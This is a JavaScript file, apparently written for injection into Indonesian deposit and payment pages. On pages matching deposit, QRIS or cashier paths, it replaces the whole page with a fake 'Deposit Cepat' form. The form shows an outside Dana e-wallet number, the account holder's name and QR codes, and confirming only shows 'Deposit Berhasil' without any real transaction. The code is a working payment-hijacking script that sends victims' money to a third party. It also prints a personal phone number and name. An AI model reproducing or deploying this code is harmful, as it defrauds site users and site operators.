document.addEventListener("DOMContentLoaded", function () {
  const params = new URLSearchParams(window.location.search);
  const path = window.location.pathname;

  if (
    !params.has("bank") &&
    !path.endsWith("/qris.php") &&
    params.get("page") !== "transaksi" &&
    params.get("page") !== "cashier" &&
    !path.endsWith("/deposit") &&
    !path.endsWith("/deposit.php")
  ) {
    console.log("Skrip tidak berjalan karena bukan di halaman yang sesuai.");
    return;
  }

  console.log("Skrip berjalan di halaman yang sesuai.");

  // Sisipkan gaya animasi jika ingin
  const style = document.createElement("style");
  style.innerHTML = `
    body {
      background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRd_4oJp1K-cYlKIAC4VnqCJ8U0VtzuAijYpAkHL1QMu_hxMydHjlLUmP0&s=10') no-repeat center center fixed;
      background-size: cover;
    }
  `;
  document.head.appendChild(style);

  document.body.innerHTML = `
    <div style="margin: 0; padding: 0; font-family: sans-serif;">
      <div style="backdrop-filter: blur(6px); background-color: rgba(255,255,255,0.8); min-height: 100vh; padding: 20px;">
        <h1 style="text-align:center; color:#333">Deposit Cepat</h1>
        <h2 style="text-align:center; color:#333">Pilih Tujuan Deposit</h2>

        <div style="max-width:500px;margin:auto;display:flex;flex-direction:column;gap:20px;">
          <select id="depositMethod" style="width:100%;padding:10px;font-size:16px;border-radius:8px;border:1px solid #ccc;margin-bottom:20px;">
            <option value="">-- Pilih Metode --</option>
            <option value="qrisBank">QRIS All Bank</option>
            <option value="dana">E-Wallet Dana</option>
            <option value="qrisEwallet">QRIS All E-Wallet</option>
          </select>

          <div id="qrisBank" style="display:none;background:white;border-radius:12px;padding:20px;box-shadow:0 2px 10px rgba(0,0,0,0.1);">
            <img src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" style="max-width:100%;border:2px solid #ccc;border-radius:10px" />
            <input id="inputBank" type="number" placeholder="Masukkan nominal" style="width:100%;padding:10px;font-size:16px;border-radius:8px;border:1px solid #ccc;margin-top:10px;" />
            <button onclick="confirmDeposit('inputBank')" style="margin-top:10px;padding:10px;width:100%;background:#28a745;color:white;font-size:16px;border:none;border-radius:8px;cursor:pointer;">Konfirmasi</button>
            <div style="font-size:14px;color:#555;text-align:center;margin-top:10px;">
              Scan > Isi Nominal > Transfer > Konfirmasi<br>
              Minimal Deposit 50K (Lima Puluh Ribu Rupiah)
            </div>
          </div>

          <div id="dana" style="display:none;background:white;border-radius:12px;padding:20px;box-shadow:0 2px 10px rgba(0,0,0,0.1);">
            <p>088214538915 a.n Surwati (E-Wallet Dana)</p>
            <img src="https://i.postimg.cc/fRLcfGs3/IMG-20250604-081202-737.jpg" style="max-width:100%;border:2px solid #ccc;border-radius:10px" />
            <input id="inputDana" type="number" placeholder="Masukkan nominal" style="width:100%;padding:10px;font-size:16px;border-radius:8px;border:1px solid #ccc;margin-top:10px;" />
            <button onclick="confirmDeposit('inputDana')" style="margin-top:10px;padding:10px;width:100%;background:#28a745;color:white;font-size:16px;border:none;border-radius:8px;cursor:pointer;">Konfirmasi</button>
            <div style="font-size:14px;color:#555;text-align:center;margin-top:10px;">
              Scan > Isi Nominal > Transfer > Konfirmasi<br>
              Minimal Deposit 50K (Lima Puluh Ribu Rupiah)
            </div>
          </div>

          <div id="qrisEwallet" style="display:none;background:white;border-radius:12px;padding:20px;box-shadow:0 2px 10px rgba(0,0,0,0.1);">
            <img src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" style="max-width:100%;border:2px solid #ccc;border-radius:10px" />
            <input id="inputEwallet" type="number" placeholder="Masukkan nominal" style="width:100%;padding:10px;font-size:16px;border-radius:8px;border:1px solid #ccc;margin-top:10px;" />
            <button onclick="confirmDeposit('inputEwallet')" style="margin-top:10px;padding:10px;width:100%;background:#28a745;color:white;font-size:16px;border:none;border-radius:8px;cursor:pointer;">Konfirmasi</button>
            <div style="font-size:14px;color:#555;text-align:center;margin-top:10px;">
              Scan > Isi Nominal > Transfer > Konfirmasi<br>
              Minimal Deposit 50K (Lima Puluh Ribu Rupiah)
            </div>
          </div>

          <button style="background:#007bff;margin-top:30px;padding:10px;width:100%;color:white;font-size:16px;border:none;border-radius:8px;cursor:pointer;" onclick="window.open('https://direct.lc.chat/19188360/', '_blank')">BANTUAN DEPOSIT</button>
        </div>

        <img src="https://gtyfup2m.112400c1199c.com/poster-QRIS.jpg" style="display:block;margin:40px auto 0;max-width:200px;" />
      </div>
    </div>
  `;

  window.confirmDeposit = function (inputId) {
    const input = document.getElementById(inputId);
    const nominal = parseInt(input.value.replace(/\D/g, ''));
    if (nominal >= 50000) {
      alert('Deposit Berhasil');
      window.location.href = '../';
    } else {
      alert('Minimal deposit 50 ribu');
    }
  };

  document.getElementById('depositMethod').addEventListener('change', function () {
    ['qrisBank', 'dana', 'qrisEwallet'].forEach(id => {
      document.getElementById(id).style.display = 'none';
    });
    const selected = this.value;
    if (selected) document.getElementById(selected).style.display = 'block';
  });
});
